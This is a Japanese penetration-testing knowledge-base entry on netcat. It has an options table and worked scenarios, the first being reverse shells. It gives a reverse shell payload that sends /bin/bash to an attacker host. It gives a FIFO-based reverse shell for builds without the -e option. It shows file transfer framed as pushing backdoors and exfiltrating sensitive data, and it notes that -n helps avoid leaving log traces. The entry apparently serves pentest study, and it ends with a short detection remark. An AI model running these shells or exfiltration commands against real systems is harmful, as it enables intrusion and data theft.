---
# --- YAML Frontmatter ---
# ドキュメントのライフサイクルや環境、脆弱性の種類を定義します。

created: '2026-03-04'
modified: '2026-03-04'

environment: [OS/Linux, OS/Windows, Network/TCP-UDP]
vulnearability: [Reverse_Shell, Bind_Shell, Port_Scanning, Data_Exfiltration]

knowledge_category: Command

tags:
  - 'nc'
  - 'netcat'
  - 'bash'
  - 'sh'
  - 'network_utility'
  - 'knowledge_base'
---
# netcat

## 1. 概要
Netcat（`nc`）は、「ネットワークの万能ナイフ（TCP/IP Swiss Army Knife）」と称される強力なネットワークツールです。TCPまたはUDPプロトコルを使用して、ネットワーク接続を介してデータを読み書きします。
ペンテストにおいては、バナーグラビング、ポートスキャン、ファイルの転送、そして何より**リバースシェル/バインドシェルの構築**において不可欠なツールです。

## 2. コマンドオプション詳細
Netcatのバージョン（OpenBSD版、GNU版、Ncat等）により微細な違いはありますが、主要な共通オプションを解説します。

| オプション | 説明 | 備考 |
| :--- | :--- | :--- |
| `-l` | リッスン（Listen）モード。入力を待機するサーバーとして動作。 | |
| `-p <port>` | ローカルポート番号を指定。 | `-l` と併用することが多い。 |
| `-n` | ホスト名解決（DNS）を無効化。 | 高速化およびログへの痕跡回避に有効。 |
| `-v` | 詳細表示（Verbose）。`-vv` でさらに詳細に。 | 接続成否を確認する際に必須。 |
| `-u` | UDPモードを使用。 | デフォルトはTCP。 |
| `-w <sec>` | 接続のタイムアウト時間を指定。 | スキャン時などに利用。 |
| `-z` | Zero-I/Oモード。スキャン用。 | データ送信を行わず、ポートの開放確認のみ行う。 |
| `-e <prog>` | 接続確立後に実行するプログラムを指定（例: `/bin/sh`）。 | **重要:** セキュリティ上の理由で本家OpenBSD版等では削除されていることが多い。 |
| `-k` | 接続終了後もリッスン状態を維持（Keep-alive）。 | 複数の接続を受け入れる場合に利用。 |

---

## 3. 実務利用シーンとログ例

### A. リバースシェルの構築 (攻撃者側での待機)
ペンテストで最も頻用されるパターンです。ターゲットマシンから攻撃者の端末へ接続させます。

**攻撃者側 (192.168.1.10) の操作:**
```bash
# ポート4444で接続を待機
nc -nlvp 4444
````

**ターゲット側 (被害者) の操作例 (Payload):**

Bash

```
# ターゲットにncがある場合
nc 192.168.1.10 4444 -e /bin/bash
```

**実務ログ例:**

Plaintext

```
listening on [any] 4444 ...
connect to [192.168.1.10] from (UNKNOWN) [192.168.1.20] 58234
whoami
www-data
hostname
target-web-srv
```

### B. バナーグラビング (サービス情報の収集)

特定のポートで動作しているサービス名やバージョンを特定します。

**実行コマンド:**

Bash

```
# HTTPサーバーに対して情報を要求
echo "HEAD / HTTP/1.0\r\n\r\n" | nc -nv 192.168.1.50 80
```

**出力結果例:**

Plaintext

```
(UNKNOWN) [192.168.1.50] 80 (http) open
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
...
```

### C. ファイル転送

バックドアの流し込みや、機密データの持ち出し（Exfiltration）に使用します。

**受信側 (192.168.1.10):**

Bash

```
nc -l -p 1234 > received_file.txt
```

**送信側:**

Bash

```
nc 192.168.1.10 1234 < sensitive_data.txt
```

---

## 4. セキュリティ上の留意点 (GTFobins / HackTricks)

- **バイナリの不在:** 近年のモダンなOS（特にUbuntu等）では、セキュリティ対策として `-e` オプション付きの `nc`（netcat-traditional）はインストールされておらず、`-e` のない `netcat-openbsd` が標準です。
    
- **回避策:** `-e` が使えない場合、パイプ（FIFO）を組み合わせてシェルを返します。
    
    Bash
    
    ```
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.10 4444 >/tmp/f
    ```
    
- **検知:** セキュリティ製品（EDR/IDS）は、`nc` のプロセス起動や、標準入出力をネットワークソケットにリダイレクトする挙動を高い優先度で検知します。